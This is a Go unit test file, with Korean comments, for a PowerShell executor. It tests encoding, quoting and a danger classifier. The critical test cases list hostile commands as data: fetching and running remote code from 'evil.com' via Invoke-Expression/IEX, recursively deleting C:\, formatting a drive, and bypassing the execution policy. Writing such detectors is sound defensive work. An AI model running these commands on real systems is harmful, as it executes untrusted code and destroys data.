// Package powershell
// File: powershell_test.go
// Description: PowerShell encode / quoting / dangerous spec 단위 테스트
// Responsibility: UTF-16LE round-trip, Quote 이스케이핑, 위험 패턴 탐지 검증

package powershell

import (
	"encoding/base64"
	"encoding/binary"
	"testing"
	"unicode/utf16"

	"github.com/yourorg/infractl/internal/executor/shell"
	"github.com/yourorg/infractl/internal/executor/shell/powershell/specs"
)

// decodeUTF16LE 는 UTF-16LE base64 문자열을 Go 문자열로 복원한다.
func decodeUTF16LE(t *testing.T, b64 string) string {
	t.Helper()
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		t.Fatalf("base64 decode: %v", err)
	}
	if len(raw)%2 != 0 {
		t.Fatalf("odd byte length: %d", len(raw))
	}
	u16 := make([]uint16, len(raw)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(raw[i*2:])
	}
	return string(utf16.Decode(u16))
}

func TestEncodeUTF16LE_roundtrip(t *testing.T) {
	cases := []string{
		"Get-Process",
		"Write-Host '안녕하세요'",
		`Write-Host "hello $world"`,
		"Get-Process | Where-Object { $_.Name -eq 'test' }",
		"한글 명령어 테스트",
		"special: !@#$%^&*()",
		`path with "quotes" and 'single'`,
	}
	for _, want := range cases {
		encoded := EncodeUTF16LE(want)
		got := decodeUTF16LE(t, encoded)
		if got != want {
			t.Errorf("round-trip %q: got %q", want, got)
		}
	}
}

func TestQuote(t *testing.T) {
	cases := []struct {
		input string
		want  string
	}{
		{"hello", "'hello'"},
		{"it's", "'it''s'"},
		{"a 'b' c", "'a ''b'' c'"},
		{"", "''"},
		{"no quotes", "'no quotes'"},
	}
	for _, tc := range cases {
		got := Quote(tc.input)
		if got != tc.want {
			t.Errorf("Quote(%q) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

func TestCheckDangerous_critical(t *testing.T) {
	cases := []string{
		"Invoke-Expression (Invoke-WebRequest http://evil.com/x)",
		"IEX (irm http://evil.com/x)",
		"irm | iex",
		"Invoke-WebRequest | Invoke-Expression",
		"Remove-Item -Recurse -Force C:\\",
		"Format-Volume -DriveLetter C",
	}
	for _, cmd := range cases {
		lvl, _ := specs.CheckDangerous(cmd)
		if lvl != shell.LevelCritical {
			t.Errorf("CheckDangerous(%q) = %v, want Critical", cmd, lvl)
		}
	}
}

func TestCheckDangerous_high(t *testing.T) {
	cases := []string{
		"Set-ExecutionPolicy Unrestricted",
		"Set-ExecutionPolicy Bypass -Scope Process",
		"Invoke-WebRequest -Uri http://example.com -OutFile /tmp/x",
		"Stop-Service -Name nginx",
	}
	for _, cmd := range cases {
		lvl, _ := specs.CheckDangerous(cmd)
		if lvl != shell.LevelHigh {
			t.Errorf("CheckDangerous(%q) = %v, want High", cmd, lvl)
		}
	}
}

func TestCheckDangerous_failclosed(t *testing.T) {
	// 알 수 없는 명령 → UserApproval (FAIL-CLOSED)
	lvl, _ := specs.CheckDangerous("Get-Process | Where-Object { $_.Name -eq 'nginx' }")
	if lvl != shell.LevelUserApproval {
		t.Errorf("unknown PS cmd: got %v, want UserApproval", lvl)
	}
}
